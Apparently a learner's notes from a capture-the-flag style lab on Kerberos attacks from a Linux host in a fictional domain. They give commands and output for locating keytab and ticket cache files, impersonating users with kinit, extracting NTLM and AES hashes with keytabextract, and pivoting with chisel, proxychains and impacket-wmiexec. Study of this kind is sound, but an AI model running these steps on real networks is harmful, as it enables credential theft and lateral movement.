### Kerberos on Linux
Windows and Linux use the same ticket granting ticket and service ticket.
 Linux stores the tickets as `ccache files` in the `/tmp`. Stored as the `KRBCCNAME`.
Another use of the kerberos in linux is with keytab files. A `Keytab` is a file containing pairs of kerberos principals and encrypted keys.
```bash
# Find command
find / -name *keytab* -ls 2>/dev/null

# Checking the crontab
crontab -l

# Checking the ccache files
env | grep -i krb5

# In the TMP files
ls -la /tmp
```

`Realm` is the active directory for linux. 
* `realm list`

```bash
# Check if a computer is domained joined
ps -ef | grep -i "winbind\|sssd"
```

# KeyTabs and the Kinit features
Kinit which mean the kerberos is active.
```bash
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```
One can even impersonate a user with the kinit feature.
```bash
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
# Logging into the user
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Using the account
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
        
# Then one can acces the shared folder with the smbclient command
smbclient //dc01/carlos -k -c ls
```

### Extracting the Keytab hashes with the keytabextract
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

### Chisel (Using Linux attack tools with Kerberos)
[Chisel](https://github.com/jpillora/chisel.git)
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

### Connecting to MS01 with xfreerdp
```bash
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

# Setting the KRB5CCNAME
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Using Impacket 
```bash
proxychains impacket-wmiexec dc01 -k
```

# Exercise
### SSH into the user
`ssh david@inlanefreight.htb@10.129.204.23`

### Which group is the machine in
```bash
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  # permitted-groups: Linux Admins
```

### Looking for the keytab file that you have read and write access to
```bash
david@inlanefreight.htb@linux01:~$ find / -name '*keytab*' -ls 2>/dev/null                                                           
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py       
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so         
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0           
   131610      4 -rw-------   1 root     root         1348 Oct  4  2022 /etc/krb5.keytab                                             
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py                        
    # 262184      4 -rw-rw-rw-   1 root     root          216 Apr  7 00:50 /opt/specialfiles/carlos.keytab                              
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py                                        
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs                                         
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

### Extracting the hashes form the keytab.
```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab                                     
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.                                                                 
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.                                                                    
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.                                                              
[+] Keytab File successfully imported.                                                                                               
        REALM : INLANEFREIGHT.HTB                                                                                                                          
        SERVICE PRINCIPAL : carlos/                                                                                                                        
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60                                                                                                       
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f                                                                    
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4  
# su - carlos@inlanefreight.htb
```

### Check the users crontab and find the keytab Carlos can access
```bash
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh 
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

carlos@inlanefreight.htb@linux01:~$ ls -la /home/carlos@inlanefreight.htb/
total 60
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct 12  2022 .
drwxr-xr-x 7 root                     root                            4096 Oct 12  2022 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    42 Oct 12  2022 .bash_history
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   220 Oct  5  2022 .bash_logout
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  3771 Oct  5  2022 .bashrc
drwx------ 3 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct  5  2022 .cache
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    15 Oct 12  2022 flag.txt
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   807 Oct  5  2022 .profile
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Apr  7 01:00 .scripts
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    49 Apr  7 01:02 script-test-results.txt
-rw-r--r-- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb    75 Oct  5  2022 .selected_editor
drwxr-xr-x 2 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct  5  2022 .vim
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 11022 Oct 12  2022 .viminfo
carlos@inlanefreight.htb@linux01:~$ ls -la /home/carlos@inlanefreight.htb/.scripts/
total 24
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Apr  7 01:00 .
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12  2022 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6  2022 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6  2022 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Apr  7 01:00 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Apr  7 01:00 svc_workstations.kt
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
carlos@inlanefreight.htb@linux01:~$ 

```